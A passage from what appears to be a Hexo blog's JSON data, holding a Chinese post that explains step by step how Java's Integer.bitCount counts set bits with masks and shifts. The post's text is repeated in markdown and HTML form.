}\n```\n\n上述代码作为Integer类中比较有意思的一个方法，该方法利用了一个技巧：通过分割分配二进制位的方式，CPU可以实现一个指令同时计算多个数值。该方法的前四行都利用了该技巧。\n\nNOTE：CPU要通过分配字节位的方式同时计算多个数值对，需要有一定的前提：由于每个数分配的字节位的长度有限，这就要求计算结果的二进制表示不能超出分配的位数。在当前问题上，显而易见是成立的：相加的两个数的最大值所占的二进制位数只有分配的二进制位的一半，结果值需要的二进制位必然不会超过分配的二进制位数。\n\n\n\n## 案例解析\n\n为了利于问题的解决，对计算二进制位1的数量这个问题，做一个等价转换：计算二进制位上每一位值的和。\n\n以数字`‭1823425321‬`为例，二进制数值为\n\n```\n‭0 1 1 0  1 1 0 0  1 0 1 0  1 1 1 1  0 1 0 0  0 0 1 1  0 0 1 0  1 0 0 1‬\n```\n\n**1. 方法第一行**\n\n将二进制的每1位都视为一个单独的数字，从左往右两个两个数字配对，形成16组二进制数相加，得到16个数值（2位二进制）。为了使结果是2位二进制数，相加前还需先给每个数前面补零。计算过程如下：\n\n```\n‭0 1  1 0  1 1  0 0  1 0  1 0  1 1  1 1  0 1  0 0  0 0  1 1  0 0  1 0  1 0  0 1‬     \n                                      ⇩  \n00   01   01   00   01   01   01   01   00   00   00   01   00   01   01   00\n                                      +\n01   00   01   00   00   00   01   01   01   00   00   01   00   00   00   01\n                                      ⇩\n01   01   10   00   01   01   10   10   01   00   00   10   00   01   01   01\n```\n\n上述计算过程用代码表示如下（0x55555555的二进制值是0b_01010101010101010101010101010101）\n\n```\ni = (i & 0x55555555) + ((i >>> 1) & 0x55555555);\n```\n\n公式中，`i >>> 1`将偶数位变为了奇数位，`& 0x55555555`则清空偶数位，结合起来之后`(i & 0x55555555)`和`((i >>> 1) & 0x55555555)`就分别提取了奇数位和偶数位的值，分别以奇偶位为基构建了两组2位二进制数数组，两组数组相加，完成第1步计算。\n\n认真的可能就会发现，不对啊，代码里分明是减法啊。实际上，第一行代码，用了另一个公式替代：对于2位二进制数n，1的个数c可用公式`c = n - (n >>> 1)`计算得到。这个公式也很容易证明：\n\n```\n假设：2位二进制n = b1 * (2 ^ 1) + b0 * (2 ^ 0)，显然b1是n的第2位数，b0是n的第1位数\n那么：所证问题等价于证明 b1 + b0 = n - b1\n因为\n    n - b1 = b1 * (2 ^ 1) + b0 * (2 ^ 0) - b1\n           = b1 * 2 + b0 - b1\n           = b1 + b0\n所以问题得证\n```\n\n新的公式的代码在计算指令上比旧的代码减少了一个指令。所以新的代码就变为了\n\n```\ni = i - ((i >>> 1) & 0x55555555);\n```\n\n\n\n**2. 方法第二行**\n\n将二进制数每2位视为一个单独的数字，从左往右两个两个数字配对，形成8组二进制数相加，得到8个数值（4位二进制）。同样的，为了使结果是4位二进制数，相加前还得给每个数前面补零。计算过程如下：\n\n```\n01  01    10  00    01  01    10  10    01  00    00  10    00  01    01   01\n                                     ⇩  \n0001      0010      0001      0010      0001      0000      0000      0001\n                                     +\n0001      0000      0001      0010      0000      0010      0001      0001\n                                     ⇩\n0010      0010      0010      0100      0001      0010      0001      0010\n```\n\n上述计算过程用代码表示如下（0x33333333的二进制值是0b_0011001100110011001100110011‬0011）\n\n```\ni = (i & 0x33333333) + ((i >>> 2) & 0x33333333);\n```\n\n同样的，公式中，通过`(i>>>2) & 0x33333333`和`i & 0x33333333`将`i`分为了相加的两部分，`0x33333333`起到了清空高2位数据的作用\n\n\n\n**3. 方法第三行**\n\n将二进制数的每4位视为一个单独的数字，从左往右两个两个数字配对，形成4组二进制数相加，得到4个数值（8位二进制）。同上所述，前面补零。计算过程如下：\n\n```\n0010   0010   0010   0100   0001   0010   0001   0010\n                          ⇩\n00000010      00000010      00000001      00000001\n                          +\n00000010      00000100      00000010      00000010\n                          ⇩\n00000100      00000110      00000011      00000011\n```\n\n上述计算过程用代码表示如下（0x0f0f0f0f的二进制值是0b_00001111000011110000111100001111‬）\n\n```\ni = (i & 0x0f0f0f0f) + ((i >>> 4) & 0x0f0f0f0f);\n```\n\n在8位二进制数中，值为1的位数最大为8，仅需4个二进制位就能表示（PS：实际上，由`n < 2 ^ (n / 2)`在`n > 4`时均成立，可以得出：在n大于4时，n位二进制数的值为1的位数值m，只需不超过`n / 2`个二进制位即可表示）。这意味着相加后的结果值也不会超过4个二进制位，所以在计算中可以先不考虑高4位会对结果造成影响，清空高4位值的计算`& 0x0f0f0f0f`可以在加法完成之后再进行，代码就可以简化成如下所示代码（比原来的代码少了一个指令）。\n\n```\ni = (i + (i >>> 4)) & 0x0f0f0f0f;\n```\n\n\n\n**4. 方法第四行**\n\n与前面一样，每8位视为一个单独的数字数字，相加之后得到2个16位二进制数值。计算过程如下：\n\n```\n00000100    00000110     00000011    00000011\n                      ⇩\n0000000000000100         0000000000000011\n                      +\n0000000000000110         0000000000000011\n                      ⇩\n0000000000001010         0000000000000110\n```\n\n代码表示如下（0x00ff00ff的二进制值是0b_00000000111111110000000011111111)\n\n```\ni = (i & 0x00ff00ff) + ((i >>> 8) & 0x00ff00ff);\n```\n\n同理于第3步，加法计算中也可以先不用担心高8位对结果造成的影响直接计算即可，代码优化为\n\n```\ni = (i + (i >>> 8)) & 0x00ff00ff;\n```\n\n此外，**对于32位的`Integer`，值为1的位数最大为32，也就是说最终结果仅需6个二进制位即可表示**。而当前每个加数都已经达到8个二进制位，这种情况下，相加后的和的高8位的值即使不清空也不会影响最终结果的低6位的值。所以，可以**将高位清空的任务留到所有计算完成后一并处理**，省略`& 0x00ff00ff`后代码简化为\n\n```\ni = i + (i >>> 8);\n```\n\n而省略`& 0x00ff00ff`后实际的计算过程是\n\n```\n00000100    00000110     00000011    00000011\n                      ⇩\n0000000000000100         0000011000000011\n                      +\n0000010000000110         0000001100000011\n                      ⇩\n0000010000001010         0000100100000110\n```\n\n\n\n**5. 方法第五行**\n\n同理于第4步，计算过程如下（以第4步中理论结果值为例）\n\n```\n0000000000001010         0000000000000110\n                    ⇩\n00000000000000000000000000001010\n                    +\n00000000000000000000000000000110\n                    ⇩\n00000000000000000000000000010000\n```\n\n代码表示如下（0x0000ffff的二进制值是0b_00000000000000001111111111111111)\n\n```\ni = (i & 0x0000ffff) + ((i >>> 16) & 0x0000ffff);\n```\n\n同理于第4步的优化，优化后代码如下\n\n```\ni = i + (i >>> 16);\n```\n\n同第4步一样的，贴出实际的计算过程如下\n\n```\n0000010000001010         0000100100000110\n                    ⇩\n00000100000010100000100100000110\n                    +\n00000000000000000000010000001010\n                    ⇩\n00000100000010100000110100010000\n```\n\n\n\n**6. 方法第六行**\n\n前面第4步说过，为了精简代码的指令，将高位清空的任务留到所有计算完成后一并处理。在第4步和第5步中均遗留了未处理的高位数据，所以第6步将完成前面未完成的高位清空工作。第4步中已经分析过了，最终结果仅需6个二进制位即可表示，所以最后清空高26位的数据，计算过程如下\n\n```\n00000100000010100000110100010000\n                ⇩\n00000000000000000000000000010000\n```\n\n代码表示如下（0x0000003f的二进制值是0b_00000000000000000000000000111111）\n\n```\ni = i & 0x0000003f;\n```\n\n所以最终的结果是`0b_10000`即16\n\n\n\n可以看出来，`Integer.bitCount`方法在代码所耗费的指令上已经作了极尽的优化。","source":"_posts/2019-12-11_Source_BitCount.md","raw":"---\ntitle: JDK中Integer.bitCount解析\ndate: 2019-12-11 19:11:49\ntags: java\npermalink: source-bitcount\nkeywords: Java, Integer, bitCount\nrId: MB-19121101\n---\n\n使用过Redis的人可能知道，Redis中给我们提供了统计二进制位数为1的位数量的指令`bitcout`，JDK中Integer类同样也给我们提供了该功能的方法`Integer.bigCount`，得益于此，我们很容易就能一窥该方法的实现\n\n```\n    public static int bitCount(int i) {\n        // HD, Figure 5-2\n        i = i - ((i >>> 1) & 0x55555555);\n        i = (i & 0x33333333) + ((i >>> 2) & 0x33333333);\n        i = (i + (i >>> 4)) & 0x0f0f0f0f;\n        i = i + (i >>> 8);\n        i = i + (i >>> 16);\n        return i & 0x3f;\n    }\n```\n\n上述代码作为Integer类中比较有意思的一个方法，该方法利用了一个技巧：通过分割分配二进制位的方式，CPU可以实现一个指令同时计算多个数值。该方法的前四行都利用了该技巧。\n\nNOTE：CPU要通过分配字节位的方式同时计算多个数值对，需要有一定的前提：由于每个数分配的字节位的长度有限，这就要求计算结果的二进制表示不能超出分配的位数。在当前问题上，显而易见是成立的：相加的两个数的最大值所占的二进制位数只有分配的二进制位的一半，结果值需要的二进制位必然不会超过分配的二进制位数。\n\n\n\n## 案例解析\n\n为了利于问题的解决，对计算二进制位1的数量这个问题，做一个等价转换：计算二进制位上每一位值的和。\n\n以数字`‭1823425321‬`为例，二进制数值为\n\n```\n‭0 1 1 0  1 1 0 0  1 0 1 0  1 1 1 1  0 1 0 0  0 0 1 1  0 0 1 0  1 0 0 1‬\n```\n\n**1. 方法第一行**\n\n将二进制的每1位都视为一个单独的数字，从左往右两个两个数字配对，形成16组二进制数相加，得到16个数值（2位二进制）。为了使结果是2位二进制数，相加前还需先给每个数前面补零。计算过程如下：\n\n```\n‭0 1  1 0  1 1  0 0  1 0  1 0  1 1  1 1  0 1  0 0  0 0  1 1  0 0  1 0  1 0  0 1‬     \n                                      ⇩  \n00   01   01   00   01   01   01   01   00   00   00   01   00   01   01   00\n                                      +\n01   00   01   00   00   00   01   01   01   00   00   01   00   00   00   01\n                                      ⇩\n01   01   10   00   01   01   10   10   01   00   00   10   00   01   01   01\n```\n\n上述计算过程用代码表示如下（0x55555555的二进制值是0b_01010101010101010101010101010101）\n\n```\ni = (i & 0x55555555) + ((i >>> 1) & 0x55555555);\n```\n\n公式中，`i >>> 1`将偶数位变为了奇数位，`& 0x55555555`则清空偶数位，结合起来之后`(i & 0x55555555)`和`((i >>> 1) & 0x55555555)`就分别提取了奇数位和偶数位的值，分别以奇偶位为基构建了两组2位二进制数数组，两组数组相加，完成第1步计算。\n\n认真的可能就会发现，不对啊，代码里分明是减法啊。实际上，第一行代码，用了另一个公式替代：对于2位二进制数n，1的个数c可用公式`c = n - (n >>> 1)`计算得到。这个公式也很容易证明：\n\n```\n假设：2位二进制n = b1 * (2 ^ 1) + b0 * (2 ^ 0)，显然b1是n的第2位数，b0是n的第1位数\n那么：所证问题等价于证明 b1 + b0 = n - b1\n因为\n    n - b1 = b1 * (2 ^ 1) + b0 * (2 ^ 0) - b1\n           = b1 * 2 + b0 - b1\n           = b1 + b0\n所以问题得证\n```\n\n新的公式的代码在计算指令上比旧的代码减少了一个指令。所以新的代码就变为了\n\n```\ni = i - ((i >>> 1) & 0x55555555);\n```\n\n\n\n**2. 方法第二行**\n\n将二进制数每2位视为一个单独的数字，从左往右两个两个数字配对，形成8组二进制数相加，得到8个数值（4位二进制）。同样的，为了使结果是4位二进制数，相加前还得给每个数前面补零。计算过程如下：\n\n```\n01  01    10  00    01  01    10  10    01  00    00  10    00  01    01   01\n                                     ⇩  \n0001      0010      0001      0010      0001      0000      0000      0001\n                                     +\n0001      0000      0001      0010      0000      0010      0001      0001\n                                     ⇩\n0010      0010      0010      0100      0001      0010      0001      0010\n```\n\n上述计算过程用代码表示如下（0x33333333的二进制值是0b_0011001100110011001100110011‬0011）\n\n```\ni = (i & 0x33333333) + ((i >>> 2) & 0x33333333);\n```\n\n同样的，公式中，通过`(i>>>2) & 0x33333333`和`i & 0x33333333`将`i`分为了相加的两部分，`0x33333333`起到了清空高2位数据的作用\n\n\n\n**3. 方法第三行**\n\n将二进制数的每4位视为一个单独的数字，从左往右两个两个数字配对，形成4组二进制数相加，得到4个数值（8位二进制）。同上所述，前面补零。计算过程如下：\n\n```\n0010   0010   0010   0100   0001   0010   0001   0010\n                          ⇩\n00000010      00000010      00000001      00000001\n                          +\n00000010      00000100      00000010      00000010\n                          ⇩\n00000100      00000110      00000011      00000011\n```\n\n上述计算过程用代码表示如下（0x0f0f0f0f的二进制值是0b_00001111000011110000111100001111‬）\n\n```\ni = (i & 0x0f0f0f0f) + ((i >>> 4) & 0x0f0f0f0f);\n```\n\n在8位二进制数中，值为1的位数最大为8，仅需4个二进制位就能表示（PS：实际上，由`n < 2 ^ (n / 2)`在`n > 4`时均成立，可以得出：在n大于4时，n位二进制数的值为1的位数值m，只需不超过`n / 2`个二进制位即可表示）。这意味着相加后的结果值也不会超过4个二进制位，所以在计算中可以先不考虑高4位会对结果造成影响，清空高4位值的计算`& 0x0f0f0f0f`可以在加法完成之后再进行，代码就可以简化成如下所示代码（比原来的代码少了一个指令）。\n\n```\ni = (i + (i >>> 4)) & 0x0f0f0f0f;\n```\n\n\n\n**4. 方法第四行**\n\n与前面一样，每8位视为一个单独的数字数字，相加之后得到2个16位二进制数值。计算过程如下：\n\n```\n00000100    00000110     00000011    00000011\n                      ⇩\n0000000000000100         0000000000000011\n                      +\n0000000000000110         0000000000000011\n                      ⇩\n0000000000001010         0000000000000110\n```\n\n代码表示如下（0x00ff00ff的二进制值是0b_00000000111111110000000011111111)\n\n```\ni = (i & 0x00ff00ff) + ((i >>> 8) & 0x00ff00ff);\n```\n\n同理于第3步，加法计算中也可以先不用担心高8位对结果造成的影响直接计算即可，代码优化为\n\n```\ni = (i + (i >>> 8)) & 0x00ff00ff;\n```\n\n此外，**对于32位的`Integer`，值为1的位数最大为32，也就是说最终结果仅需6个二进制位即可表示**。而当前每个加数都已经达到8个二进制位，这种情况下，相加后的和的高8位的值即使不清空也不会影响最终结果的低6位的值。所以，可以**将高位清空的任务留到所有计算完成后一并处理**，省略`& 0x00ff00ff`后代码简化为\n\n```\ni = i + (i >>> 8);\n```\n\n而省略`& 0x00ff00ff`后实际的计算过程是\n\n```\n00000100    00000110     00000011    00000011\n                      ⇩\n0000000000000100         0000011000000011\n                      +\n0000010000000110         0000001100000011\n                      ⇩\n0000010000001010         0000100100000110\n```\n\n\n\n**5. 方法第五行**\n\n同理于第4步，计算过程如下（以第4步中理论结果值为例）\n\n```\n0000000000001010         0000000000000110\n                    ⇩\n00000000000000000000000000001010\n                    +\n00000000000000000000000000000110\n                    ⇩\n00000000000000000000000000010000\n```\n\n代码表示如下（0x0000ffff的二进制值是0b_00000000000000001111111111111111)\n\n```\ni = (i & 0x0000ffff) + ((i >>> 16) & 0x0000ffff);\n```\n\n同理于第4步的优化，优化后代码如下\n\n```\ni = i + (i >>> 16);\n```\n\n同第4步一样的，贴出实际的计算过程如下\n\n```\n0000010000001010         0000100100000110\n                    ⇩\n00000100000010100000100100000110\n                    +\n00000000000000000000010000001010\n                    ⇩\n00000100000010100000110100010000\n```\n\n\n\n**6. 方法第六行**\n\n前面第4步说过，为了精简代码的指令，将高位清空的任务留到所有计算完成后一并处理。在第4步和第5步中均遗留了未处理的高位数据，所以第6步将完成前面未完成的高位清空工作。第4步中已经分析过了，最终结果仅需6个二进制位即可表示，所以最后清空高26位的数据，计算过程如下\n\n```\n00000100000010100000110100010000\n                ⇩\n00000000000000000000000000010000\n```\n\n代码表示如下（0x0000003f的二进制值是0b_00000000000000000000000000111111）\n\n```\ni = i & 0x0000003f;\n```\n\n所以最终的结果是`0b_10000`即16\n\n\n\n可以看出来，`Integer.bitCount`方法在代码所耗费的指令上已经作了极尽的优化。","slug":"source-bitcount","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi074002mg0uk0fz82vy1","content":"<p>使用过Redis的人可能知道，Redis中给我们提供了统计二进制位数为1的位数量的指令<code>bitcout</code>，JDK中Integer类同样也给我们提供了该功能的方法<code>Integer.bigCount</code>，得益于此，我们很容易就能一窥该方法的实现</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public static int bitCount(int i) &#123;</span><br><span class=\"line\">    // HD, Figure 5-2</span><br><span class=\"line\">    i = i - ((i &gt;&gt;&gt; 1) &amp; 0x55555555);</span><br><span class=\"line\">    i = (i &amp; 0x33333333) + ((i &gt;&gt;&gt; 2) &amp; 0x33333333);</span><br><span class=\"line\">    i = (i + (i &gt;&gt;&gt; 4)) &amp; 0x0f0f0f0f;</span><br><span class=\"line\">    i = i + (i &gt;&gt;&gt; 8);</span><br><span class=\"line\">    i = i + (i &gt;&gt;&gt; 16);</span><br><span class=\"line\">    return i &amp; 0x3f;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>上述代码作为Integer类中比较有意思的一个方法，该方法利用了一个技巧：通过分割分配二进制位的方式，CPU可以实现一个指令同时计算多个数值。该方法的前四行都利用了该技巧。</p>\n<p>NOTE：CPU要通过分配字节位的方式同时计算多个数值对，需要有一定的前提：由于每个数分配的字节位的长度有限，这就要求计算结果的二进制表示不能超出分配的位数。在当前问题上，显而易见是成立的：相加的两个数的最大值所占的二进制位数只有分配的二进制位的一半，结果值需要的二进制位必然不会超过分配的二进制位数。</p>\n<h2 id=\"案例解析\"><a href=\"#案例解析\" class=\"headerlink\" title=\"案例解析\"></a>案例解析</h2><p>为了利于问题的解决，对计算二进制位1的数量这个问题，做一个等价转换：计算二进制位上每一位值的和。</p>\n<p>以数字<code>‭1823425321‬</code>为例，二进制数值为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">‭0 1 1 0  1 1 0 0  1 0 1 0  1 1 1 1  0 1 0 0  0 0 1 1  0 0 1 0  1 0 0 1‬</span><br></pre></td></tr></table></figure>\n\n<p><strong>1. 方法第一行</strong></p>\n<p>将二进制的每1位都视为一个单独的数字，从左往右两个两个数字配对，形成16组二进制数相加，得到16个数值（2位二进制）。为了使结果是2位二进制数，相加前还需先给每个数前面补零。计算过程如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">‭0 1  1 0  1 1  0 0  1 0  1 0  1 1  1 1  0 1  0 0  0 0  1 1  0 0  1 0  1 0  0 1‬     </span><br><span class=\"line\">                                      ⇩  </span><br><span class=\"line\">00   01   01   00   01   01   01   01   00   00   00   01   00   01   01   00</span><br><span class=\"line\">                                      +</span><br><span class=\"line\">01   00   01   00   00   00   01   01   01   00   00   01   00   00   00   01</span><br><span class=\"line\">                                      ⇩</span><br><span class=\"line\">01   01   10   00   01   01   10   10   01   00   00   10   00   01   01   01</span><br></pre></td></tr></table></figure>\n\n<p>上述计算过程用代码表示如下（0x55555555的二进制值是0b_01010101010101010101010101010101）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i = (i &amp; 0x55555555) + ((i &gt;&gt;&gt; 1) &amp; 0x55555555);</span><br></pre></td></tr></table></figure>\n\n<p>公式中，<code>i &gt;&gt;&gt; 1</code>将偶数位变为了奇数位，<code>&amp; 0x55555555</code>则清空偶数位，结合起来之后<code>(i &amp; 0x55555555)</code>和<code>((i &gt;&gt;&gt; 1) &amp; 0x55555555)</code>就分别提取了奇数位和偶数位的值，分别以奇偶位为基构建了两组2位二进制数数组，两组数组相加，完成第1步计算。</p>\n<p>认真的可能就会发现，不对啊，代码里分明是减法啊。实际上，第一行代码，用了另一个公式替代：对于2位二进制数n，1的个数c可用公式<code>c = n - (n &gt;&gt;&gt; 1)</code>计算得到。这个公式也很容易证明：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">假设：2位二进制n = b1 * (2 ^ 1) + b0 * (2 ^ 0)，显然b1是n的第2位数，b0是n的第1位数</span><br><span class=\"line\">那么：所证问题等价于证明 b1 + b0 = n - b1</span><br><span class=\"line\">因为</span><br><span class=\"line\">    n - b1 = b1 * (2 ^ 1) + b0 * (2 ^ 0) - b1</span><br><span class=\"line\">           = b1 * 2 + b0 - b1</span><br><span class=\"line\">           = b1 + b0</span><br><span class=\"line\">所以问题得证</span><br></pre></td></tr></table></figure>\n\n<p>新的公式的代码在计算指令上比旧的代码减少了一个指令。所以新的代码就变为了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i = i - ((i &gt;&gt;&gt; 1) &amp; 0x55555555);</span><br></pre></td></tr></table></figure>\n\n<p><strong>2. 方法第二行</strong></p>\n<p>将二进制数每2位视为一个单独的数字，从左往右两个两个数字配对，形成8组二进制数相加，得到8个数值（4位二进制）。同样的，为了使结果是4位二进制数，相加前还得给每个数前面补零。计算过程如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">01  01    10  00    01  01    10  10    01  00    00  10    00  01    01   01</span><br><span class=\"line\">                                     ⇩  </span><br><span class=\"line\">0001      0010      0001      0010      0001      0000      0000      0001</span><br><span class=\"line\">                                     +</span><br><span class=\"line\">0001      0000      0001      0010      0000      0010      0001      0001</span><br><span class=\"line\">                                     ⇩</span><br><span class=\"line\">0010      0010      0010      0100      0001      0010      0001      0010</span><br></pre></td></tr></table></figure>\n\n<p>上述计算过程用代码表示如下（0x33333333的二进制值是0b_0011001100110011001100110011‬0011）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i = (i &amp; 0x33333333) + ((i &gt;&gt;&gt; 2) &amp; 0x33333333);</span><br></pre></td></tr></table></figure>\n\n<p>同样的，公式中，通过<code>(i&gt;&gt;&gt;2) &amp; 0x33333333</code>和<code>i &amp; 0x33333333</code>将<code>i</code>分为了相加的两部分，<code>0x33333333</code>起到了清空高2位数据的作用</p>\n<p><strong>3. 方法第三行</strong></p>\n<p>将二进制数的每4位视为一个单独的数字，从左往右两个两个数字配对，形成4组二进制数相加，得到4个数值（8位二进制）。同上所述，前面补零。计算过程如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0010   0010   0010   0100   0001   0010   0001   0010</span><br><span class=\"line\">                          ⇩</span><br><span class=\"line\">00000010      00000010      00000001      00000001</span><br><span class=\"line\">                          +</span><br><span class=\"line\">00000010      00000100      00000010      00000010</span><br><span class=\"line\">                          ⇩</span><br><span class=\"line\">00000100      00000110      00000011      00000011</span><br></pre></td></tr></table></figure>\n\n<p>上述计算过程用代码表示如下（0x0f0f0f0f的二进制值是0b_00001111000011110000111100001111‬）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i = (i &amp; 0x0f0f0f0f) + ((i &gt;&gt;&gt; 4) &amp; 0x0f0f0f0f);</span><br></pre></td></tr></table></figure>\n\n<p>在8位二进制数中，值为1的位数最大为8，仅需4个二进制位就能表示（PS：实际上，由<code>n &lt; 2 ^ (n / 2)</code>在<code>n &gt; 4</code>时均成立，可以得出：在n大于4时，n位二进制数的值为1的位数值m，只需不超过<code>n / 2</code>个二进制位即可表示）。这意味着相加后的结果值也不会超过4个二进制位，所以在计算中可以先不考虑高4位会对结果造成影响，清空高4位值的计算<code>&amp; 0x0f0f0f0f</code>可以在加法完成之后再进行，代码就可以简化成如下所示代码（比原来的代码少了一个指令）。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i = (i + (i &gt;&gt;&gt; 4)) &amp; 0x0f0f0f0f;</span><br></pre></td></tr></table></figure>\n\n<p><strong>4. 方法第四行</strong></p>\n<p>与前面一样，每8位视为一个单独的数字数字，相加之后得到2个16位二进制数值。计算过程如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00000100    00000110     00000011    00000011</span><br><span class=\"line\">                      ⇩</span><br><span class=\"line\">0000000000000100         0000000000000011</span><br><span class=\"line\">                      +</span><br><span class=\"line\">0000000000000110         0000000000000011</span><br><span class=\"line\">                      ⇩</span><br><span class=\"line\">0000000000001010         0000000000000110</span><br></pre></td></tr></table></figure>\n\n<p>代码表示如下（0x00ff00ff的二进制值是0b_00000000111111110000000011111111)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i = (i &amp; 0x00ff00ff) + ((i &gt;&gt;&gt; 8) &amp; 0x00ff00ff);</span><br></pre></td></tr></table></figure>\n\n<p>同理于第3步，加法计算中也可以先不用担心高8位对结果造成的影响直接计算即可，代码优化为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i = (i + (i &gt;&gt;&gt; 8)) &amp; 0x00ff00ff;</span><br></pre></td></tr></table></figure>\n\n<p>此外，<strong>对于32位的<code>Integer</code>，值为1的位数最大为32，也就是说最终结果仅需6个二进制位即可表示</strong>。而当前每个加数都已经达到8个二进制位，这种情况下，相加后的和的高8位的值即使不清空也不会影响最终结果的低6位的值。所以，可以<strong>将高位清空的任务留到所有计算完成后一并处理</strong>，省略<code>&amp; 0x00ff00ff</code>后代码简化为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i = i + (i &gt;&gt;&gt; 8);</span><br></pre></td></tr></table></figure>\n\n<p>而省略<code>&amp; 0x00ff00ff</code>后实际的计算过程是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00000100    00000110     00000011    00000011</span><br><span class=\"line\">                      ⇩</span><br><span class=\"line\">0000000000000100         0000011000000011</span><br><span class=\"line\">                      +</span><br><span class=\"line\">0000010000000110         0000001100000011</span><br><span class=\"line\">                      ⇩</span><br><span class=\"line\">0000010000001010         0000100100000110</span><br></pre></td></tr></table></figure>\n\n<p><strong>5. 方法第五行</strong></p>\n<p>同理于第4步，计算过程如下（以第4步中理论结果值为例）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0000000000001010         0000000000000110</span><br><span class=\"line\">                    ⇩</span><br><span class=\"line\">00000000000000000000000000001010</span><br><span class=\"line\">                    +</span><br><span class=\"line\">00000000000000000000000000000110</span><br><span class=\"line\">                    ⇩</span><br><span class=\"line\">00000000000000000000000000010000</span><br></pre></td></tr></table></figure>\n\n<p>代码表示如下（0x0000ffff的二进制值是0b_00000000000000001111111111111111)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i = (i &amp; 0x0000ffff) + ((i &gt;&gt;&gt; 16) &amp; 0x0000ffff);</span><br></pre></td></tr></table></figure>\n\n<p>同理于第4步的优化，优化后代码如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">i = i + (i &gt;&gt;&gt; 16);</span><br></pre></td></tr></table></figure>\n\n<p>同第4步一样的，贴出实际的计算过程如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0000010000001010         0000100100000110</span><br><span class=\"line\">                    ⇩</span><br><span class=\"line\">00000100000010100000100100000110</span><br><span class=\"line\">                    +</span><br><span class=\"line\">00000000000000000000010000001010</span><br><span class=\"line\">                    ⇩</span><br><span class=\"line\">00000100000010100000110100010000</span><br></pre></td></tr></table></figure>\n\n<p><strong>6. 